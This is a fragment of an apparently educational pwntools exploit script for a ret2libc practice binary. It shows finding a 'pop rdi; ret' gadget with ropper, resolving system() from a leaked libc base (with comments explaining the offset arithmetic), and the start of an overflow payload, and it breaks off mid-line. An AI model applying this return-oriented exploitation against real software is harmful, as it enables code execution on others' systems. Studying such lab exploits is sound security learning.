...
# To find necessary gadgets, run: ropper --file ./ret2libc_leak --nocolor --console
# then: 
POP_RDI   = 0x4011df    # run: search pop rdi; ret
...
system_addr = libc.symbols['system']    # After setting libc.address to libc_base, pwntools AUTOMATICALLY converts
                                        # this symbol into an absolute address: system = libc_base + offset(system)
                                        # This is why we can directly use libc.symbols['system'] to get the actual address
                                        # of system() in libc, without needing to manually add the offset to the base address.
p.recvuntil(b'looking for?\n')
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
